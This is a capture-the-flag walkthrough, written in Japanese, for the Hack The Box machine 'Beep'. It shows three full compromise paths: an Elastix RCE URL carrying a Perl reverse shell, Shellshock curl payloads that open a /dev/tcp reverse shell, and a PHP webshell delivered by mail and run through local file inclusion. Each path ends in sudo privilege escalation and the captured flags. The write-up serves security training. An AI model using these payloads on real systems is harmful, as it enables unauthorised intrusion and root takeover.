https://app.hackthebox.com/machines/Beep

## STEP 1
```sh
└─$ rustscan -a 10.129.205.98 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.205.98:22
Open 10.129.205.98:25
Open 10.129.205.98:80
Open 10.129.205.98:110
Open 10.129.205.98:111
Open 10.129.205.98:143
Open 10.129.205.98:443
Open 10.129.205.98:857
Open 10.129.205.98:993
Open 10.129.205.98:995
Open 10.129.205.98:3306
Open 10.129.205.98:4190
Open 10.129.205.98:4445
Open 10.129.205.98:4559
Open 10.129.205.98:5038
Open 10.129.205.98:10000
10.129.205.98 -> [22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000]
```
```sh
└─$ nmap -n -Pn -p 22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000 -sV 10.129.205.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 07:40 EDT
Nmap scan report for 10.129.205.98
Host is up (0.52s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
857/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.41 seconds
```


## PATH 1
8B番にアクセスすると、443番にリダイレクトされた  
がsslエラーが発生した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_01.png">  
どうやらtlsv1.0が有効らしい
```sh
└─$ sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 10.129.205.98
Version: 2.1.5
OpenSSL 3.5.0 8 Apr 2025

Connected to 10.129.205.98

Testing SSL server 10.129.205.98 on port 443 using SNI name 10.129.205.98

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   disabled
TLSv1.2   disabled
TLSv1.3   disabled
```
firefoxの設定を修正  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_02.png">  
無事確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_03.png">  
elastixには、CVE-2012-4869の脆弱性があり、「/recordings/misc/callme_page.php」にrceの欠陥があるらしい
```sh
└─$ searchsploit -m 18650
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
Copied to: /home/kali/18650.py
```
PoCを確認するとurlのワンライナーでRCEできるっぽい  
修正する部分は、rhost、lhost、lport、extension  
extensionは、sipのextensinのこと、elastixはVoIP系のソフトウェアなのね
```
https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
ちなみにPoCをurlデコードすると、リバースシェルにperlを使っているっぽい
```python
└─$ python3.13
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.parse
>>> print(urllib.parse.unquote("https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%2\
9%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"))
https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'+str(lhost)+':'+str(lport)+'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
ということで、PoCに必要なextensionを発見
```sh
└─$ svwar -t 0.1 -e 0-300 -m INVITE 10.129.229.183
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
PoCのrce実行
```html
└─$ curl --insecure --tlsv1.0 'https://10.129.205.98/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.11%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <TITLE>Voicemail Message Call Me Control</TITLE>
    <link rel="stylesheet" href="../theme/main.css" type="text/css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>

<table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'><tr><td valign='middle' style='border: 0px'><a href='callme_page.php?action=h&callmenum=233@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.11:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

'>Click here to hang up.</a></td></tr></table><script language='javascript'>parent.document.getElementById('callme_status').innerHTML = 'The call has been answered.';</script><script language='javascript'>parent.document.getElementById('pb_load_inprogress').value='false';</script><script language='javascript'>parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';</script>  </body>
</html>
```
リーバスシェル取得、ユーザフラグゲット！
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 59677

python -c 'import pty; pty.spawn("/bin/bash")'

bash-3.2$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               export SHELL=bash

bash-3.2$ export TERM=xterm-256color

bash-3.2$ stty rows 66 columns 236

bash-3.2$ id
uid=100(asterisk) gid=101(asterisk)

bash-3.2$ cat /home/fanis/user.txt
2d69147c6496412b22133b3a0bd01a6e
```
sudoでnmapをroot権限で実行できる  
[リンク](https://gtfobins.github.io/gtfobins/nmap/#sudo)どおりで権限昇格、ルートフラグゲット！
```sh
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig

bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash

bash-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

bash-3.2# cat /root/root.txt
458340087499999a4af363208718ed2c
```


## PATH 2
10000番ポートにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_04.png">  
webページのソースを確認すると、このページは`/session_login.cgi`で動いているっぽい
```html
└─$ curl -ks https://10.129.205.98:10000 | grep cgi
<form class='ui_form' action='/session_login.cgi' method=post >
```
cgiで動いているので、shellshockがあるか[PoC](https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin)で調査
```sh
└─$ curl k -A "() { :;}; ping -c 1 10.10.16.11" https://10.129.205.98:10000
```
pingが返ってきたので、CVE-2014-6271を確認！
```sh
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:22:00.190545 IP 10.129.205.98 > 10.10.16.11: ICMP echo request, id 45120, seq 1, length 64
20:22:00.190575 IP 10.10.16.11 > 10.129.205.98: ICMP echo reply, id 45120, seq 1, length 64
```
ということで、shellshockでrce
```sh
└─$ curl -k -A "() { :;}; bash -i >& /dev/tcp/10.10.16.11/4444 0>&1" https://10.129.205.98:10000
<!doctype html public "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<link rel='stylesheet' type='text/css' href='/unauthenticated/style.css' />
<script type='text/javascript' src='/unauthenticated/toggleview.js'></script>
<script>
var rowsel = new Array();
</script>
<script type='text/javascript' src='/unauthenticated/sorttable.js'></script>
<meta http-equiv="Content-Type" content="text/html; Charset=iso-8859-1">
^C
```
リバースシェル取得！ルートゲット
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 52292
bash: no job control in this shell
[root@beep webmin]# id
uid=0(root) gid=0(root)
```


## PATH 3
path2で、LFIを確認した
```sh
└─$ searchsploit -m 37637 
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/kali/37637.pl
```
smtpでメール本文内にphpのwebshellを埋め込み・送付
```sh
└─$ swaks --to asterisk@localhost --from kali@localhost --header "Subject: test shell" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.129.205.98
=== Trying 10.129.205.98:25...
=== Connected to 10.129.205.98.
<-  220 beep.localdomain ESMTP Postfix
 -> EHLO kali
<-  250-beep.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<kali@localhost>
<-  250 2.1.0 Ok
 -> RCPT TO:<asterisk@localhost>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Fri, 27 Jun 2025 21:48:31 -0400
 -> To: asterisk@localhost
 -> From: kali@localhost
 -> Subject: test shell
 -> Message-Id: <20250627214831.570096@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> check out this code: <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as E5F79C0003
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```
LFIでwebshellを実行できることが分かった
```sh
└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=id" | grep 'From kali@localhost' -A 30
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 18434    0 18434    0     0  11360      0 --:--:--  0:00:01 --:--:-- 11357
From kali@localhost.localdomain  Sat Jun 28 04:48:53 2025
Return-Path: <kali@localhost.localdomain>
X-Original-To: asterisk@localhost
Delivered-To: asterisk@localhost.localdomain
Received: from kali (unknown [10.10.16.11])
        by beep.localdomain (Postfix) with ESMTP id E5F79C0003
        for <asterisk@localhost>; Sat, 28 Jun 2025 04:48:52 +0300 (EEST)
Date: Fri, 27 Jun 2025 21:48:31 -0400
To: asterisk@localhost
From: kali@localhost
Subject: test shell
Message-Id: <20250627214831.570096@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

check out this code: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)



Sorry! Attempt to access restricted file.
```
リバースシェル用のコマンド実行
```sh
└─$ urlencode "bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"  
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261

└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261"
```
リバースシェル取得！
sudoでchmodを操作できるので、rootがユーザであるbashにSUIDを付与し、権限昇格成功！
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 49601
bash: no job control in this shell
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)

bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

bash-3.2$ sudo chmod 4755 /bin/bash

bash-3.2$ /bin/bash -p

id
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
```
